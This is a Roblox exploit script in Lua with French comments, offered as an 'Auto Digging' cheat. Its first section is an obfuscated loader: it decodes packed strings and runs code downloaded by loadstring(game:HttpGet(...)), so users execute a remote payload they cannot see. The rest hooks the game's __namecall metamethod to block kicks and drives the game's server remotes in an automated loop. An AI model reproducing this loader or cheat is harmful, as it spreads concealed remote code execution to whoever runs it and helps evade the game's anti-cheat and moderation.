-- ======================================================
--  1. CODE OBFUSQUÉ (LOADER EXTERNE)
-- ======================================================
local X={"s:r;sjg4sgJtU;F5;?9P#7i4CI-u[\"[Ll2fE`nARG";"s#8iE7gm\\]S39]YS-cFEZ;qAA-#0aAaY`nYX;11S>f+Q&*","s_2:H.tp_)"}local function E(E)return X[E+1974]end for E,w in ipairs({{1;3},{1,2},{3;3}})do while w[1]<w[2]do X[w[1]],X[w[2]],w[1],w[2]=X[w[2]],X[w[1]],w[1]+1,w[2]-1 end end do local E=string.char local w=string.len local R=string.sub local o=table.insert local l=math.floor local S={W=0,d=25,["\\"]=74;["."]=54;["+"]=78,["#"]=33,l=80;Q=20;b=76;["@"]=47,["`"]=21;T=42;n=51,o=73;Y=15,X=9;K=8;J=29,p=16,L=38,["("]=66,f=14;a=4;["7"]=23;U=43;k=59;r=5;A=31;["3"]=34,e=68,s=45,u=46,j=11,["-"]=32;Z=22;B=56;["\""]=44,["%"]=61;["="]=71,[")"]=83,_=26,["!"]=70;I=1,H=63;i=50;[":"]=36,["*"]=28;["$"]=40;c=49,D=17;q=69;["^"]=55,S=12;["<"]=6;["5"]=7;C=19,F=67,g=37,R=77;["\'"]=41;["]"]=82;V=60;G=18;E=30,["?"]=65;h=3,[">"]=81,["["]=79;N=52;["/"]=39,[";"]=35;["2"]=64;m=2,O=53,["0"]=75,["9"]=72,["8"]=48,[","]=27,["6"]=58;P=84,["&"]=57;M=10,["1"]=13,["4"]=62;t=24}local h=type local p=X local a={J=55,z=3,["9"]=59;x=1;T=35;g=31,b=13;U=25,q=45,D=43,s=22,["4"]=37;j=12,["2"]=5;p=2,n=30,["3"]=42,["+"]=54;["1"]=48;W=52,L=36,o=33,d=34;X=6,M=53,["6"]=0,t=62;a=46;["0"]=63,l=57,c=11;Y=16,C=41,f=10,y=32,["/"]=18,i=47,K=39,O=17,Q=21,H=15,u=38,R=40;w=14,h=7;m=23;r=50,E=56,S=27,N=49;G=29;["8"]=9,["5"]=60;e=24;P=58,k=61,I=28,V=44,["7"]=19;A=20;v=51;Z=4;F=26,B=8}local x=table.concat for X=1,#p,1 do local j=p[X]if h(j)=="string"then local h=R(j,1,1)if h=="/"then j=R(j,2)local S=w(j)local h={}local V=1 local f=0 local D=0 while V<=S do local X=R(j,V,V)local w=a[X]if w then f=f+w*(64^((3-D)))D=D+1 if D==4 then D=0 local X=l(f/65536)local w=l((f%65536)/256)local R=f%256 o(h,E(X,w,R))f=0 end elseif X=="="then o(h,E(l(f/65536)))if V>=S or R(j,V+1,V+1)~="="then o(h,E(l((f%65536)/256)))end break end V=V+1 end p[X]=x(h)elseif h=="s"then j=R(j,2)local h=w(j)local a={}local V=1 while V<=h do local X=(h-V)+1 local w=X>=5 and 5 or X local p=0 local x=w>1 for X=0,4,1 do local E if X<w then local w=R(j,V+X,V+X)E=S[w]if not E then x=false break end else E=84 end p=p*85+E end if x then local X=l(p/16777216)%256 local R=l(p/65536)%256 local S=l(p/256)%256 local h=p%256 if w==5 then o(a,E(X,R,S,h))elseif w==4 then o(a,E(X,R,S))elseif w==3 then o(a,E(X,R))elseif w==2 then o(a,E(X))end end V=V+w end p[X]=x(a)end end end end;(getgenv())[E(-1972)]=E(-1971);(loadstring(game:HttpGet(E(-1973))))()

-- ======================================================
--  2. AUTO DIGGING GUI (CODE PRINCIPAL)
-- ======================================================
if not game:IsLoaded() then game.Loaded:Wait() end

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ANTI-KICK LOCAL
local antiKickEnabled = true
local oldNamecall
local function setupAntiKick()
    local success, err = pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        oldNamecall = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if antiKickEnabled and (method == "Kick" or tostring(method):lower() == "kick") then
                warn("[Anti-Kick] Tentative de kick bloquée !")
                return nil
            end
            return oldNamecall(self, ...)
        end)
    end)
    if not success then warn("[Anti-Kick] Erreur d'installation :", err) end
end
setupAntiKick()

-- RÉCUPÉRATION DES REMOTES
local remotes = {}
local remotesReady = false

local function initRemotes()
    local success, err = pcall(function()
        local Net = ReplicatedStorage:WaitForChild("Packages", 10):WaitForChild("Net", 10)
        remotes.Dig         = Net:WaitForChild("RE/EventService/Digging/Dig", 10)
        remotes.Carve       = Net:WaitForChild("RE/EventService/Digging/Carve", 10)
        remotes.SpawnFacing = Net:WaitForChild("RE/EventService/Digging/SpawnFacing", 10)
        remotes.UseItem     = Net:WaitForChild("RE/UseItem", 10)
        remotes.DropPiece   = Net:WaitForChild("RF/EventService/Digging/DropPiece", 10)
    end)
    if success then
        remotesReady = true
        return true
    else
        warn("[Init] Erreur d'initialisation :", err)
        remotesReady = false
        return false
    end
end
initRemotes()

-- CONFIGURATION
local CONFIG = {
    DIG_DELAY  = 0.5, 
    DIG_OFFSET = Vector3.new(0, -3, 0) 
}

_G.AutoDigging = false
local hitCount = 0
local errorCount = 0
local maxErrors = 5

-- INTERFACE GRAPHIQUE
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoDig_GUI_Pro"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 260, 0, 160)
mainFrame.Position = UDim2.new(0.5, -130, 0.5, -80)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
local stroke = Instance.new("UIStroke", mainFrame)
stroke.Color = Color3.fromRGB(90, 90, 120)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 32)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
title.BorderSizePixel = 0
title.Text = "⚒ Auto Digging Safe"
title.TextColor3 = Color3.fromRGB(220, 220, 255)
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0.85, 0, 0, 42)
toggleBtn.Position = UDim2.new(0.075, 0, 0, 45)
toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
toggleBtn.BorderSizePixel = 0
toggleBtn.Text = "DÉSACTIVÉ"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.TextSize = 14
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.Parent = mainFrame
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 1, -55)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Prêt"
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 170)
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = mainFrame

local hitsLabel = Instance.new("TextLabel")
hitsLabel.Size = UDim2.new(1, 0, 0, 20)
hitsLabel.Position = UDim2.new(0, 0, 1, -35)
hitsLabel.BackgroundTransparency = 1
hitsLabel.Text = "Coups: 0 | Erreurs: 0"
hitsLabel.TextColor3 = Color3.fromRGB(120, 200, 150)
hitsLabel.TextSize = 12
hitsLabel.Font = Enum.Font.Gotham
hitsLabel.Parent = mainFrame

-- FONCTIONS UTILITAIRES
local function getPickaxe()
    local char = player.Character
    if not char then return nil end
    local bp = player:FindFirstChild("Backpack")
    for _, t in ipairs(char:GetChildren()) do
        if t:IsA("Tool") then return t end
    end
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") then
                pcall(function() t.Parent = char end)
                return t
            end
        end
    end
    return nil
end

local function updateStatus(msg, isError)
    statusLabel.Text = msg
    statusLabel.TextColor3 = isError and Color3.fromRGB(220, 100, 100) or Color3.fromRGB(150, 150, 170)
end

-- BOUCLE D'AUTO-DIG
task.spawn(function()
    while true do
        task.wait(CONFIG.DIG_DELAY)
        
        if not _G.AutoDigging then
            errorCount = 0
            continue
        end
        
        if not remotesReady then
            updateStatus("Reconnexion...", true)
            initRemotes()
            continue
        end
        
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        
        if not hrp then
            updateStatus("Personnage introuvable", true)
            continue
        end
        
        getPickaxe()
        local targetPos = hrp.Position + CONFIG.DIG_OFFSET
        
        local success, err = pcall(function()
            remotes.UseItem:FireServer()
            remotes.Dig:FireServer(targetPos)
            remotes.Carve:FireServer(targetPos)
            remotes.SpawnFacing:FireServer(targetPos)
            remotes.DropPiece:InvokeServer() -- RF !
        end)
        
        if success then
            hitCount = hitCount + 1
            errorCount = 0
            hitsLabel.Text = string.format("Coups: %d | Erreurs: %d", hitCount, errorCount)
        else
            errorCount = errorCount + 1
            hitsLabel.Text = string.format("Coups: %d | Erreurs: %d", hitCount, errorCount)
            warn("[Auto-Dig] Erreur remote :", err)
            if errorCount >= maxErrors then
                updateStatus("Pause de 3s (erreurs)...", true)
                task.wait(3)
                errorCount = 0
                initRemotes()
            end
        end
    end
end)

-- BOUTON
local function updateButton()
    if _G.AutoDigging then
        toggleBtn.Text = "ACTIVÉ"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 170, 65)
        updateStatus("Minage en cours...", false)
    else
        toggleBtn.Text = "DÉSACTIVÉ"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        updateStatus("Prêt", false)
    end
end

toggleBtn.MouseButton1Click:Connect(function()
    _G.AutoDigging = not _G.AutoDigging
    updateButton()
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.R then
        _G.AutoDigging = not _G.AutoDigging
        updateButton()
    end
end)

updateButton()
print("[Auto-Dig] Script chargé avec succès !")
